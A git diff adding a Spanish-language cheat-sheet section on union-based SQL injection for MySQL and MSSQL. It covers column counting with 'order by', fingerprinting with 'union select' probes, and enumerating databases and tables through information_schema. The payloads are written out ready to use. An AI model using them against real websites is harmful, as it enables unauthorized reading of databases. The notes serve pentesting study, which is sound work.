@@ -28,3 +28,19 @@ No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos us
 
 Con una base de datos que nos interese podemos acceder a su contenido con
 `' union select 1,table_name from information_schema.tables limit 1,1-- -`
+
+
+## Listar contenido de las bases de datos
+#### MySQL y MSSQL
+Identificar el numero de columnas
+`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
+
+Una vez ya hemos identificado las columnas debemos probar con un
+`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL
+
+Para enumerar las bases de datos existentes
+`' union select 1,schema_name from information_schema.schemata-- -`
+
+No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos usar 
+`' union select 1,schema_name from information_schema.schemata limit 1,1-- -`, donde vamos enumerando uno a uno las bases de datos
+
